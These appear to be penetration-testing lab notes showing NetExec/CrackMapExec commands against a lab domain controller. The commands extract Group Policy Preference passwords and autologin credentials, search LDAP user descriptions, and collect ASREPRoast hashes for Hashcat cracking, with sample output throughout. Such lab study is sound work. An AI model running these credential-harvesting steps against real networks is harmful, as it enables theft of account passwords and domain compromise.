# Searching Account in GPO

Once we have control of an account, there are some mandatory checks we need to perform. Searching for credentials written in the `Group Policy Objects` (`GPO`) can pay off, especially in an old environment (Windows server 2003 / 2008) since every domain user can read the GPOs.

CrackMapExec has two modules that will search all the GPOs and find juicy credentials. We can use the modules `gpp_password` and `gpp_autologin`.

## Password GPP

The first module, `gpp_password`, retrieves the plaintext password and other information for accounts pushed through `Group Policy Preferences` (`GPP`).

```bash
nxc smb 10.129.204.177 -u grace -p Inlanefreight01! -M gpp_password

<SNIP>

GPP_PASS... 10.129.204.177  445    DC01             [*] Found inlanefreight.htb/Policies/{C17DD5D1-0D41-4AE9-B393-ADF5B3DD208D}/Machine/Preferences/Groups/Groups.xml
GPP_PASS... 10.129.204.177  445    DC01             [+] Found credentials in inlanefreight.htb/Policies/{C17DD5D1-0D41-4AE9-B393-ADF5B3DD208D}/Machine/Preferences/Groups/Groups.xml
GPP_PASS... 10.129.204.177  445    DC01             Password: HackingGPPlike4Pro
GPP_PASS... 10.129.204.177  445    DC01             action: U
GPP_PASS... 10.129.204.177  445    DC01             newName:
GPP_PASS... 10.129.204.177  445    DC01             fullName:
GPP_PASS... 10.129.204.177  445    DC01             description:
GPP_PASS... 10.129.204.177  445    DC01             changeLogon: 0
GPP_PASS... 10.129.204.177  445    DC01             noChange: 1
GPP_PASS... 10.129.204.177  445    DC01             neverExpires: 1
GPP_PASS... 10.129.204.177  445    DC01             acctDisabled: 0
GPP_PASS... 10.129.204.177  445    DC01             userName: inlanefreight.htb\diana
```

## AutoLogin GPP

The second module, `gpp_autologin`, searches the Domain Controller for `registry.xml` files to find autologin information and returns the username and clear text password if present.

```bash
❯ nxc smb 10.129.204.177 -u grace -p Inlanefreight01! -M gpp_autologin
SMB         10.129.204.177  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) 

<SNIP>

GPP_AUTO... 10.129.204.177  445    DC01             [+] Found credentials in inlanefreight.htb/Policies/{C17DD5D1-0D41-4AE9-B393-ADF5B3DD208D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 10.129.204.177  445    DC01             Usernames: ['kiosko']
GPP_AUTO... 10.129.204.177  445    DC01             Domains: ['INLANEFREIGHT']
GPP_AUTO... 10.129.204.177  445    DC01             Passwords: ['SimplePassword123!']
```

# Working with Modules

## View Available Modules for LDAP

```bash
❯ nxc ldap -L
```

## Identifying Options in Modules

```shell
$ nxc ldap -M MAQ --options

[*] MAQ module options:
None
```

```bash
nxc ldap -M user-desc --options
[*] user-desc module options:

LDAP_FILTER     Custom LDAP search filter (fully replaces the default search)
DESC_FILTER     An additional search filter for descriptions (supports wildcard *)
DESC_INVERT     An additional search filter for descriptions (shows non matching)
USER_FILTER     An additional search filter for usernames (supports wildcard *)
USER_INVERT     An additional search filter for usernames (shows non matching)
KEYWORDS        Use a custom set of keywords (comma separated)
ADD_KEYWORDS    Add additional keywords to the default set (comma separated)
```

## Using a Module with Options

```bash
$ crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M user-desc -o KEYWORDS=pwd,admin
```

```bash
nxc ldap 10.129.204.177 -u grace -p Inlanefreight01! -M user-desc -o KEYWORDS=IP
LDAP        10.129.204.177  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:inlanefreight.htb)
LDAP        10.129.204.177  389    DC01             [+] inlanefreight.htb\grace:Inlanefreight01!
USER-DESC   10.129.204.177  389    DC01             User: john - Description: User for kiosko IP 172.16.10.9
USER-DESC   10.129.204.177  389    DC01             Saved 8 user descriptions to /home/akhmad/.nxc/logs/UserDesc-DC01.inlanefreight.htb-20260103_163350.log
```

## Querying Group Membership with a Custom Module

```bash
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M groupmembership -o USER=julio
```

```bash
❯ nxc ldap 10.129.204.177 -u grace -p Inlanefreight01! -M groupmembership -o USER=julio
LDAP        10.129.204.177  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:inlanefreight.htb)
LDAP        10.129.204.177  389    DC01             [+] inlanefreight.htb\grace:Inlanefreight01!
GROUPMEM... 10.129.204.177  389    DC01             [+] User: julio is member of following groups:
GROUPMEM... 10.129.204.177  389    DC01             Server Operators
GROUPMEM... 10.129.204.177  389    DC01             Domain Admins
GROUPMEM... 10.129.204.177  389    DC01             Domain Users
```

# Finding ASREPRoastable Accounts

The `ASREPRoast` attack looks for users without Kerberos pre-authentication required. That means that anyone can send an `AS_REQ` request to the KDC on behalf of any of those users and receive an `AS_REP` message. This last kind of message contains a chunk of data encrypted with the original user key derived from its password. Then, using this message, the user password could be cracked offline if the user chose a relatively weak password.

```bash
❯ nxc ldap 10.129.204.177 -u users.txt -p '' --asreproast asreproeast.out
LDAP        10.129.204.177  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:inlanefreight.htb)
LDAP        10.129.204.177  389    DC01             $krb5asrep$23$noemi@INLANEFREIGHT.HTB:64f9a2aa13d459655851d453d9770b81$d6442e8968
LDAP        10.129.204.177  389    DC01             $krb5asrep$23$linda@INLANEFREIGHT.HTB:d2b017a5187920a6e44c95b6828c0209$235ecb129b
```

```bash
❯ nxc ldap 10.129.204.177 -u grace -p Inlanefreight01! --asreproast asreproeast.out
LDAP        10.129.204.177  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:inlanefreight.htb)
LDAP        10.129.204.177  389    DC01             [+] inlanefreight.htb\grace:Inlanefreight01!
LDAP        10.129.204.177  389    DC01             [*] Total of records returned 3
LDAP        10.129.204.177  389    DC01             $krb5asrep$23$robert@INLANEFREIGHT.HTB:929fd7ae982c904883b5a4ae9b8e1eab$fff5f992c
LDAP        10.129.204.177  389    DC01             $krb5asrep$23$noemi@INLANEFREIGHT.HTB:6e02b606edf58ac05bca2a994e329f20$c415bd3973
LDAP        10.129.204.177  389    DC01             $krb5asrep$23$linda@INLANEFREIGHT.HTB:6a43c5b7d5c08f19361fbc51bbd37bc4$411c6cce2d
```

Once we get all the hash, we can use Hashcat with module `18200` and try to crack them.

```bash
hashcat -a 0 -m 18200 asreproast.out ~/rockyou.txt
```